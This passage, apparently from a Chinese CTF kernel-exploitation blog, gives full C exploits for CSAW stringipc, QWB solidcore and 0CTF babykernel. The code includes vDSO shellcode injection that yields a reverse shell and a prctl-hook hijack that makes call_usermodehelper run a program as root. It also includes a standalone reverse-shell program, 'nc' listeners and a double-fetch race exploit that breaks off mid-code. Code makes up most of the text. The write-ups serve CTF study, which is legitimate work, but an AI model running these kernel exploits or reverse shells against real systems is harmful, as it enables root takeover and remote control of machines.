alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"gettimeofday"</span>,buf+<span class="number">0x2cd</span>))&#123;</span><br><span class="line">            vDSO_addr = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]vDSO_addr in kernelspace = %p\n"</span>,vDSO_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seek_channel.id = alloc_channel.id;</span><br><span class="line">    seek_channel.index = vDSO_addr+<span class="number">0xc80</span><span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);   </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"\x90\x53\x48\x31\xC0\xB0\x66\x0F"</span></span><br><span class="line">                       <span class="string">"\x05\x48\x31\xDB\x48\x39\xC3\x75"</span></span><br><span class="line">                       <span class="string">"\x0F\x48\x31\xC0\xB0\x39\x0F\x05"</span></span><br><span class="line">                       <span class="string">"\x48\x31\xDB\x48\x39\xD8\x74\x09"</span></span><br><span class="line">                       <span class="string">"\x5B\x48\x31\xC0\xB0\x60\x0F\x05"</span></span><br><span class="line">                       <span class="string">"\xC3\x48\x31\xD2\x6A\x01\x5E\x6A"</span></span><br><span class="line">                       <span class="string">"\x02\x5F\x6A\x29\x58\x0F\x05\x48"</span></span><br><span class="line">                       <span class="string">"\x97\x50\x48\xB9\xFD\xFF\xF2\xFA"</span></span><br><span class="line">                       <span class="string">"\x80\xFF\xFF\xFE\x48\xF7\xD1\x51"</span></span><br><span class="line">                       <span class="string">"\x48\x89\xE6\x6A\x10\x5A\x6A\x2A"</span></span><br><span class="line">                       <span class="string">"\x58\x0F\x05\x48\x31\xDB\x48\x39"</span></span><br><span class="line">                       <span class="string">"\xD8\x74\x07\x48\x31\xC0\xB0\xE7"</span></span><br><span class="line">                       <span class="string">"\x0F\x05\x90\x6A\x03\x5E\x6A\x21"</span></span><br><span class="line">                       <span class="string">"\x58\x48\xFF\xCE\x0F\x05\x75\xF6"</span></span><br><span class="line">                       <span class="string">"\x48\x31\xC0\x50\x48\xBB\xD0\x9D"</span></span><br><span class="line">                       <span class="string">"\x96\x91\xD0\x8C\x97\xFF\x48\xF7"</span></span><br><span class="line">                       <span class="string">"\xD3\x53\x48\x89\xE7\x50\x57\x48"</span></span><br><span class="line">                       <span class="string">"\x89\xE6\x48\x31\xD2\xB0\x3B\x0F"</span></span><br><span class="line">                       <span class="string">"\x05\x48\x31\xC0\xB0\xE7\x0F\x05"</span>;</span><br><span class="line">    write_channel.id = alloc_channel.id;</span><br><span class="line">    write_channel.buf = shellcode;</span><br><span class="line">    write_channel.count = <span class="built_in">strlen</span>(shellcode); </span><br><span class="line">    ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(check_shellcode(shellcode))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Write shellcode success!!!"</span>);</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]Trigger shell!!!"</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">void</span> (*gettimeofday)();</span><br><span class="line">            gettimeofday = <span class="number">0xc80</span> + getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">            gettimeofday();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">"nc -lp 3333"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Write shellcode fail..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h2><p>劫持<code>prctl</code></p>
<h3 id="寻找偏移："><a href="#寻找偏移：" class="headerlink" title="寻找偏移："></a>寻找偏移：</h3><p>这道题需要找偏移的变量为：</p>
<ul>
<li><code>poweroff_cmd</code>，一个可写的字符串全局变量。</li>
<li><code>hp-&gt;hook.task_prctl</code>，一个函数指针，需要动态调试。</li>
<li><code>poweroff_work_func</code>，一个函数。</li>
</ul>
<h4 id="有源码："><a href="#有源码：" class="headerlink" title="有源码："></a>有源码：</h4><p>自己下载对应版本的源码自行编译得到带符号表的<code>vmlinux</code>与<code>bzImage</code>，将<code>vmlinux</code>放到内核源码下（不要移动即可），将<code>bzImage</code>替换题目给的<code>bzImage</code>，这里需要注意的是<strong>即使内核版本一样偏移也会有小的差异</strong>，如果<code>bzImage</code>与<code>vmlinux</code>不配套的话，调试的时候会发生很诡异的事情，请自行尝试: ）。</p>
<p>然后就可以对内核函数直接下断点，因为有符号表了，看结构体也方便的多了，可以用<code>prctl</code>这个函数来在中间某处断下exp，看中间变量的值是否写入成功等。</p>
<h4 id="无源码："><a href="#无源码：" class="headerlink" title="无源码："></a>无源码：</h4><p>懒得下载编译源码，闲太麻烦了的话，可以先用<code>root</code>权限进入<code>qemu</code>，然后<code>cat /proc/kallsyms | grep symbols_you_want_to_get</code>来找你要的变量或者函数的加载地址，然后<code>cat /proc/kallsyms | grep startup_64</code>来看内核代码加载基址，相减确定偏移即可。</p>
<p>若是像找<code>hp-&gt;hook.task_prctl</code>这种需要动态调试到现场才可看到，则可以用上一步得到的函数地址来在<code>gdb</code>里先下好断点（因为没有符号表，所以只能先用root看到地址再下断点），然后<code>c</code>到那里，然后单步跳到对应的函数调用汇编语句，例如这题是<code>call  qword ptr [rbx+0x18]</code>，再看寄存器确定偏移即可。</p>
<h3 id="反弹shell：-1"><a href="#反弹shell：-1" class="headerlink" title="反弹shell："></a>反弹shell：</h3><p>这道题最终的调用为：<code>call_usermodehelper(poweroff_cmd)</code>，我们这时已经将<code>poweroff_cmd</code>改为可控字符串了。<code>call_usermodehelper()</code>会运行<code>poweroff_cmd</code>这个进程，且赋予其<code>root</code>权限。所以等于这个函数帮助我们完成了提权，所以这时候我们可以选择运行一个我们自己编译好的正常的反弹<code>shell</code>程序，也可以直接将<code>flag</code>的权限变为<code>777</code>。</p>
<h2 id="reverse-shell："><a href="#reverse-shell：" class="headerlink" title="reverse_shell："></a>reverse_shell：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd,numbytes;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">their_addr</span>;</span></span><br><span class="line">    <span class="keyword">while</span>((sockfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)) == <span class="number">-1</span>);</span><br><span class="line">    their_addr.sin_family = AF_INET;</span><br><span class="line">    their_addr.sin_port = htons(<span class="number">2333</span>);</span><br><span class="line">    their_addr.sin_addr.s_addr=inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">    bzero(&amp;(their_addr.sin_zero), <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(connect(sockfd,(struct sockaddr*)&amp;their_addr,<span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">0</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">2</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exp：-6"><a href="#exp：-6" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0L</span>L,<span class="number">2</span>,<span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open fail..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]This is our channel_id: %d\n"</span>,alloc_channel.id);</span><br><span class="line"></span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Now we can r&amp;w any where we want!!!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> vDSO_kernel = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> addr=<span class="number">0xffffffff80000000</span>;</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf+<span class="number">0x2cd</span>,<span class="string">"gettimeofday"</span>))&#123;</span><br><span class="line">            vDSO_kernel = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]Find vDSO_addr in kernelspace: %p\n"</span>,vDSO_kernel);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = vDSO_kernel &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> prctl_hook = <span class="number">0xeb7df8</span>;</span><br><span class="line">	<span class="keyword">size_t</span> poweroff_cmd = <span class="number">0xe4dfa0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> poweroff_work_func_addr = <span class="number">0xa39c0</span>;</span><br><span class="line">    prctl_hook += kernel_base;</span><br><span class="line">    poweroff_cmd += kernel_base;</span><br><span class="line">    poweroff_work_func_addr += kernel_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Prctl_hook_addr = %p\n"</span>,prctl_hook);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Poweroff_cmd_addr = %p\n"</span>,poweroff_cmd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Powoff_work_func_addr = %p\n"</span>,poweroff_work_func_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------------------------------------------------</span></span><br><span class="line">    seek_channel.id = alloc_channel.id;</span><br><span class="line">    seek_channel.index = poweroff_cmd<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x1000);</span><br><span class="line">    <span class="comment">//strcpy(buf,"/bin/chmod 777 /flag\x00");</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"/reverse_shell\x00"</span>);</span><br><span class="line">    write_channel.id = alloc_channel.id;</span><br><span class="line">    write_channel.buf = buf;</span><br><span class="line">    write_channel.count = <span class="built_in">strlen</span>(buf)+<span class="number">1</span>; </span><br><span class="line">    ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line"><span class="comment">//--------------------------------------------------------------</span></span><br><span class="line">    seek_channel.id = alloc_channel.id;</span><br><span class="line">    seek_channel.index = prctl_hook<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);  </span><br><span class="line"></span><br><span class="line">    memset(buf,'\x00',0x1000);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">    write_channel.id = alloc_channel.id;</span><br><span class="line">    write_channel.buf = buf;</span><br><span class="line">    write_channel.count = <span class="number">8</span>; </span><br><span class="line">    ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Trigger!!!"</span>);</span><br><span class="line">        prctl(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    system(<span class="string">"nc -lp 2333"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2018强网杯-solidcore"><a href="#2018强网杯-solidcore" class="headerlink" title="2018强网杯_solidcore"></a>2018强网杯_solidcore</h1><p>主要限制了内存写的范围必须大于<code>0xffffffff80000000</code>，并且限制了内核态<code>vDSO</code>的写入权限。</p>
<p>同<code>2015CSAW_stringipc</code>的劫持<code>prctl</code>方法。</p>
<h1 id="20180CTF-FINAL-babykernel"><a href="#20180CTF-FINAL-babykernel" class="headerlink" title="20180CTF-FINAL_babykernel"></a>20180CTF-FINAL_babykernel</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p><code>Double Fetch</code>，需要多跑几次。</p>
<p><img src="https://i.loli.net/2020/02/08/tls1UomCfFW9AdI.png" alt="x1.PNG"></p>
<h2 id="exp：-7"><a href="#exp：-7" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> times = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* flag;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">void</span> *a1)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span>* <span class="title">tmp</span> = <span class="title">a1</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(finish == <span class="number">0</span>)&#123;</span><br><span class="line">        tmp-&gt;flag = flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 